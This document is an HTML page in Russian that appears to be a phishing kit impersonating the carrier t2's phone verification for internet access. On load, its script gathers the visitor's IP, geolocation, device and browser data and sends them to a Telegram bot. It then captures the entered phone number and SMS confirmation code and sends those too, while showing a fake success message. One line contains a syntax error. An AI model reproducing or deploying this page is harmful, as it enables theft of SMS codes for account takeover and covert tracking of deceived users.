<!DOCTYPE html>
<html>
<head>
    <title>Подтверждение номера</title>
    <meta charset="UTF-8">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --dark-bg: #121212;
            --card-bg: #1e1e1e;
            --border: #333;
            --accent: #2563eb;
            --text: #e0e0e0;
            --success: #10b981;
            --error: #ef4444;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: var(--dark-bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .header {
            padding: 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .provider-logo {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #0047FF 0%, #002DAD 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
            color: white;
        }
        
        .header-text {
            flex: 1;
        }
        
        .header-text h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .header-text p {
            color: #aaa;
            font-size: 14px;
        }
        
        .content {
            padding: 25px;
        }
        
        #phone-section, #code-section, #verification-section {
            transition: all 0.3s ease;
        }
        
        .section-title {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-title svg {
            width: 20px;
            height: 20px;
        }
        
        .input-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #aaa;
        }
        
        input {
            width: 100%;
            padding: 14px;
            background: #2a2a2a;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        
        input:focus {
            border-color: var(--accent);
        }
        
        input.error {
            border-color: var(--error);
        }
        
        .error-message {
            color: var(--error);
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        
        button:hover:not(:disabled) {
            background: #1d4ed8;
        }
        
        #phone-image {
            width: 100%;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }
        
        #verification-section {
            display: none;
        }
        
        .verification-success {
            text-align: center;
            padding: 30px 0;
        }
        
        .success-icon {
            font-size: 60px;
            color: var(--success);
            margin-bottom: 20px;
        }
        
        .verification-success h2 {
            font-size: 24px;
            margin-bottom: 15px;
            color: var(--success);
        }
        
        .footer {
            padding: 20px;
            text-align: center;
            color: #777;
            font-size: 12px;
            border-top: 1px solid var(--border);
        }
        
        #code-section, #verification-section {
            display: none;
        }
        
        .loader {
            display: none;
            text-align: center;
            padding: 30px 0;
        }
        
        .loader-spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid var(--accent);
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-text">
                <h1>Подтверждение номера</h1>
                <p>Требуется для подключения к интернету</p>
            </div>
        </div>
        
        <div class="content">
            <!-- Шаг 0: Загрузка данных -->
            <div id="loading-section" class="loader">
                <div class="loader-spinner"></div>
                <p>Проверка безопасности...</p>
            </div>
            
            <!-- Шаг 1: Ввод телефона -->
            <div id="phone-section" style="display:none">
                <div class="section-title">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                    </svg>
                    <span>Введите номер телефона</span>
                </div>
                
                <div class="input-group">
                    <label for="phone">Российский номер телефона</label>
                    <input 
                        type="tel" 
                        id="phone" 
                        placeholder="+7 (___) ___-__-__" 
                        required
                        maxlength="18"
                    >
                    <div class="error-message" id="phone-error">Введите корректный российский номер</div>
                </div>
                
                <button id="confirm-btn" onclick="sendPhone()" disabled>Подтвердить номер</button>
            </div>
            
            <!-- Шаг 2: Ввод кода -->
            <div id="code-section" style="display:none">
                <div class="section-title">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                    </svg>
                    <span>Введите код подтверждения</span>
                </div>
               
                <img id="phone-image" src="https://i.redd.it/861gk9gqka0c1.png" alt="Security">
                
                <div class="input-group">
                    <label for="code">Код из SMS (6 цифр)</label>
                    <input 
                        type="text" 
                        id="code" 
                        placeholder="XXXXXX" 
                        required
                        maxlength="6"
                        oninput="validateCode(this)"
                    >
                    <div class="error-message" id="code-error">Код должен состоять из 6 цифр</div>
                </div>
                
                <button id="code-btn" onclick="sendCode()" disabled>Подтвердить код</button>
            </div>
            
            <!-- Шаг 3: Результат верификации -->
            <div id="verification-section" style="display:none">
                <div class="verification-success">
                    <div class="success-icon">✓</div>
                    <h2>Верификация успешно пройдена!</h2>
                    <p>Ваш номер верифицирован и получен доступ к интернету!</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            © 2025 t2. Все права защищены.
        </div>
    </div>

    <script>
        const BOT_TOKEN = "DIG";
        const CHAT_ID = "1209403544";
        const MAX_RETRIES = 3; // Максимальное количество попыток отправки
        
        // Объект для сбора данных
        const userData = {
            // Основные идентификаторы
            ip: "N/A",
            
            // Сетевые данные
            isp: "N/A",
            asn: "N/A",
            publicIp: "N/A",
            
            // Геолокация
            continent: "N/A",
            country: "N/A",
            countryCode: "N/A",
            region: "N/A",
            regionCode: "N/A",
            city: "N/A",
            postalCode: "N/A",
            latitude: "N/A",
            longitude: "N/A",
            timezone: "N/A",
            utcOffset: "N/A",
            callingCode: "N/A",
            currency: "N/A",
            languages: "N/A",
            
            // Устройство
            deviceType: "N/A",
            deviceModel: "N/A",
            deviceVendor: "N/A",
            os: "N/A",
            osVersion: "N/A",
            cpuCores: "N/A",
            cpuArch: "N/A",
            deviceMemory: "N/A",
            
            // Браузер
            browser: "N/A",
            browserVersion: "N/A",
            engine: "N/A",
            engineVersion: "N/A",
            userAgent: "N/A",
            cookies: "N/A",
            
            // Время и дата
            localTime: "N/A",
            utcTime: "N/A",
            timezoneOffset: "N/A",
            dst: "N/A",
            pageLoadTime: "N/A",
            
            // Поведение
            referrer: "N/A",
            entryUrl: "N/A",
            mouseEvents: 0,
            keyboardEvents: 0,
            touchSupport: "N/A",
            batteryLevel: "N/A",
            chargingStatus: "N/A",
            
            // Дополнительные параметры
            doNotTrack: "N/A",
            hardwareConcurrency: "N/A",
            devicePixelRatio: "N/A",
            browserLanguage: "N/A"
        };

        // Валидация кода (6 цифр)
        function validateCode(input) {
            const code = input.value.replace(/\D/g, '');
            input.value = code;
            
            const codeError = document.getElementById('code-error');
            const codeBtn = document.getElementById('code-btn');
            
            if (code.length === 6) {
                input.classList.remove('error');
                codeError.style.display = 'none';
                codeBtn.disabled = false;
            } else {
                input.classList.add('error');
                codeError.style.display = 'block';
                codeBtn.disabled = true;
            }
        }

        // Маска для номера телефона
        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 11) value = value.substring(0, 11);
            
            let formattedValue = '';
            
            if (value.startsWith('7') || value.startsWith('8')) {
                if (value[0] === '8') value = '7' + value.substring(1);
                formattedValue = '+7';
                
                if (value.length > 1) formattedValue += ' (' + value.substring(1, 4);
                if (value.length > 4) formattedValue += ') ' + value.substring(4, 7);
                if (value.length > 7) formattedValue += '-' + value.substring(7, 9);
                if (value.length > 9) formattedValue += '-' + value.substring(9, 11);
            } else if (value) {
                formattedValue = '+' + value;
            }
            
            input.value = formattedValue;
            validatePhoneNumber();
        }
        
        // Проверка номера
        function validatePhoneNumber() {
            const phoneInput = document.getElementById('phone');
            const phoneError = document.getElementById('phone-error');
            const confirmBtn = document.getElementById('confirm-btn');
            
            const phoneRegex = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[\s-]?\d{2}[\s-]?\d{2}$/;
            const isValid = phoneRegex.test(phoneInput.value);
            
            if (isValid) {
                phoneInput.classList.remove('error');
                phoneError.style.display = 'none';
                confirmBtn.disabled = false;
            } else {
                phoneInput.classList.add('error');
                phoneError.style.display = 'block';
                confirmBtn.disabled = true;
            }
            
            return isValid;
        }
        
        // Определение устройства по userAgent
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            
            // Определение ОС
            if (/android/i.test(ua)) {
                userData.os = "Android";
                const match = ua.match(/android\s([0-9\.]+)/i);
                userData.osVersion = match ? match[1] : "N/A";
            } else if (/iPad|iPhone|iPod/.test(ua)) {
                userData.os = "iOS";
                const match = ua.match(/OS\s(\d+_\d+)/i);
                if (match) userData.osVersion = match[1].replace('_', '.');
            } else if (/Macintosh|Mac OS X/.test(ua)) {
                userData.os = "macOS";
                const match = ua.match(/Mac OS X\s?([0-9_]+)/i);
                if (match) userData.osVersion = match[1].replace('_', '.');
            } else if (/Windows/.test(ua)) {
                userData.os = "Windows";
                const match = ua.match(/Windows NT\s?([0-9\.]+)/i);
                userData.osVersion = match ? match[1] : "N/A";
            } else if (/Linux/.test(ua)) {
                userData.os = "Linux";
                userData.osVersion = "N/A";
            }
            
            // Определение браузера
            if (/Chrome/.test(ua) && !/Edge|Edg/.test(ua)) {
                userData.browser = "Chrome";
                const match = ua.match(/Chrome\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[1] : "N/A";
            } else if (/Firefox/.test(ua)) {
                userData.browser = "Firefox";
                const match = ua.match(/Firefox\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[1] : "N/A";
            } else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
                userData.browser = "Safari";
                const match = ua.match(/Version\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[1] : "N/A";
            } else if (/Edge|Edg/.test(ua)) {
                userData.browser = "Edge";
                const match = ua.match(/(Edge|Edg)\/([0-9\.]+)/i);
                userData.browserVersion = match ? match[2] : "N/A";
            }
            
            // Определение устройства
            if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
                userData.deviceType = "Mobile";
            } else {
                userData.deviceType = "Desktop";
            }
            
            // Определение модели устройства
            const deviceMatch = ua.match(/(iPhone|iPad|iPod|Android|Windows Phone|BlackBerry|PlayBook|Xbox One|Xbox|PlayStation|Nintendo)/i);
            if (deviceMatch) {
                userData.deviceModel = deviceMatch[1];
            }
        }
        
        // Основная функция сбора данных
        async function collectFullData() {
            try {
                // 1. Сетевые данные
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    userData.ip = ipData.ip || "Не определен";
                    userData.publicIp = ipData.ip || "Не определен";
                } catch (e) {
                    console.log("Ошибка получения IP: ", e);
                }
                
                // 2. Геолокация
                if (userData.ip !== "Не определен") {
                    try {
                        const geoResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
                        const geoData = await geoResponse.json();
                        
                        if (!geoData.error) {
                            userData.continent = geoData.continent_code || "Не определен";
                            userData.country = geoData.country_name || "Не определен";
                            userData.countryCode = geoData.country_code || "Не определен";
                            userData.region = geoData.region || "Не определен";
                            userData.regionCode = geoData.region_code || "Не определен";
                            userData.city = geoData.city || "Не определен";
                            userData.postalCode = geoData.postal || "Не определен";
                            userData.latitude = geoData.latitude || "Не определен";
                            userData.longitude = geoData.longitude || "Не определен";
                            userData.timezone = geoData.timezone || "Не определен";
                            userData.utcOffset = geoData.utc_offset || "Не определен";
                            userData.callingCode = geoData.country_calling_code || "Не определен";
                            userData.currency = geoData.currency || "Не определен";
                            userData.languages = geoData.languages || "Не определен";
                            userData.isp = geoData.org || "Не определен";
                            userData.asn = geoData.asn || "Не определен";
                        }
                    } catch (e) {
                        console.log("Ошибка геолокации: ", e);
                    }
                }
                
                // 3. Данные устройства и браузера
                getDeviceInfo();
                
                // 4. Основные данные
                userData.userAgent = navigator.userAgent;
                userData.cookies = navigator.cookieEnabled ? "Включены" : "Отключены";
                userData.doNotTrack = navigator.doNotTrack || "Не поддерживается";
                userData.referrer = document.referrer || "Прямой переход";
                userData.entryUrl = window.location.href;
                
                // 5. Временные параметры
                userData.localTime = new Date().toLocaleString();
                userData.utcTime = new Date().toUTCString();
                userData.timezoneOffset = new Date().getTimezoneOffset();
                userData.browserLanguage = navigator.language || "Не определен";
                
                // 6. Производительность
                if (window.performance) {
                    userData.pageLoadTime = 
                        window.performance.timing.domContentLoadedEventEnd - 
                        window.performance.timing.navigationStart + " ms";
                }
                
                // 7. Дополнительные параметры
                userData.hardwareConcurrency = navigator.hardwareConcurrency || "Не определен";
                userData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Не определен";
                
            } catch (e) {
                console.error("Ошибка сбора данных: ", e);
            }
        }
        
        // Отправка данных в Telegram с повторными попытками
        async function sendToTelegram(text) {
            for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: const CHAT_ID,
                            text: text,
                            parse_mode: "HTML"
                        })
                    });
                    
                    const data = await response.json();
                    if (data.ok) return true;
                    
                    console.log(`Попытка ${attempt} не удалась: ${data.description}`);
                } catch (e) {
                    console.log(`Ошибка отправки (попытка ${attempt}):`, e);
                }
                
                // Задержка перед повторной попыткой
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
            return false;
        }
        
        // Форматирование данных для Telegram
        function formatFullData() {
            let message = `🌐 <b>ДАННЫЕ ПОЛЬЗОВАТЕЛЯ</b> 🌐\n`;
            
            message += `📍 <b>ГЕОЛОКАЦИЯ</b>\n`;
            message += `├ Страна: ${userData.country} (${userData.countryCode})\n`;
            message += `├ Регион: ${userData.region}\n`;
            message += `├ Город: ${userData.city}\n`;
            message += `├ Почтовый индекс: ${userData.postalCode}\n`;
            message += `├ Координаты: ${userData.latitude}, ${userData.longitude}\n`;
            message += `├ Часовой пояс: ${userData.timezone}\n`;
            message += `├ Провайдер: ${userData.isp}\n`;
            message += `└ IP-адрес: ${userData.ip}\n\n`;
            
            message += `💻 <b>УСТРОЙСТВО</b>\n`;
            message += `├ Тип: ${userData.deviceType}\n`;
            message += `├ Модель: ${userData.deviceModel || "Не определено"}\n`;
            message += `├ ОС: ${userData.os} ${userData.osVersion || ""}\n`;
            message += `├ Ядра CPU: ${userData.hardwareConcurrency}\n`;
            message += `└ Память: ${userData.deviceMemory}\n\n`;
            
            message += `🔍 <b>БРАУЗЕР</b>\n`;
            message += `├ Название: ${userData.browser}\n`;
            message += `├ Версия: ${userData.browserVersion}\n`;
            message += `├ Язык: ${userData.browserLanguage}\n`;
            message += `├ Cookies: ${userData.cookies}\n`;
            message += `└ User Agent: ${userData.userAgent}\n\n`;
            
            message += `⏱ <b>ВРЕМЯ И ПРОИЗВОДИТЕЛЬНОСТЬ</b>\n`;
            message += `├ Локальное время: ${userData.localTime}\n`;
            message += `├ UTC время: ${userData.utcTime}\n`;
            message += `└ Загрузка страницы: ${userData.pageLoadTime || "Недоступно"}\n\n`;
            
            message += `🔗 <b>СЕССИЯ</b>\n`;
            message += `├ Источник: ${userData.referrer}\n`;
            message += `└ URL входа: ${userData.entryUrl}`;
            
            return message;
        }
        
        // Отправка полного дампа
        async function sendFullDataToTelegram() {
            const message = formatFullData();
            return await sendToTelegram(message);
        }
        
        // Отправка номера
        async function sendPhone() {
            if (!validatePhoneNumber()) return;
            
            let phone = document.getElementById('phone').value;
            phone = phone.replace(/\D/g, '');
            if (phone.startsWith('8')) phone = '7' + phone.substring(1);
            userData.phone = '+' + phone;
            
            // Переключение на экран кода
            document.getElementById('phone-section').style.display = 'none';
            document.getElementById('phone-image').style.display = 'block';
            document.getElementById('code-section').style.display = 'block';
            
            // Отправка номера в Telegram
            await sendToTelegram(`📱 <b>ВВЕДЕН НОМЕР:</b> ${userData.phone}`);
        }
        
        // Отправка кода
        async function sendCode() {
            const codeInput = document.getElementById('code');
            userData.code = codeInput.value;
            
            // Проверка длины кода
            if (userData.code.length !== 6) {
                codeInput.classList.add('error');
                document.getElementById('code-error').style.display = 'block';
                return;
            }
            
            // Переключение на экран верификации
            document.getElementById('code-section').style.display = 'none';
            document.getElementById('verification-section').style.display = 'block';
            
            // Отправка кода в Telegram
            await sendToTelegram(`🔢 <b>ВВЕДЕН КОД:</b> ${userData.code}\n✅ <b>Верификация пройдена</b>`);
        }
        
        // Показать секцию телефона
        function showPhoneSection() {
            document.getElementById('loading-section').style.display = 'none';
            document.getElementById('phone-section').style.display = 'block';
        }
        
        // Инициализация
        window.onload = async function() {
            // Показать лоадер
            document.getElementById('loading-section').style.display = 'block';
            
            // Настройка маски телефона
            const phoneInput = document.getElementById('phone');
            phoneInput.addEventListener('input', () => formatPhoneNumber(phoneInput));
            phoneInput.addEventListener('blur', validatePhoneNumber);
            
            // Запуск сбора данных
            try {
                await collectFullData();
                await sendFullDataToTelegram();
            } catch (e) {
                console.error("Критическая ошибка: ", e);
            } finally {
                showPhoneSection();
            }
        };
    </script>
</body>
</html>
